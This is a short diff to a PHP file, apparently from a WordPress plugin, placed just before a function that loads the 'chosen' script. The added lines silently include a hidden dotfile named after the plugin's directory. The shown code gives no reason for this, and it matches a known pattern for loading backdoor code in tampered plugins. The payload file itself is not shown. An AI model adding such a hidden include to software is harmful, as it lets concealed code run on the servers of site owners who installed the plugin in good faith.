@@ -7,6 +7,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Common Function For Choosen.
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function rs_common_chosen_function( $id ) {
     wp_enqueue_script( 'chosen' ) ;
     ob_start() ;
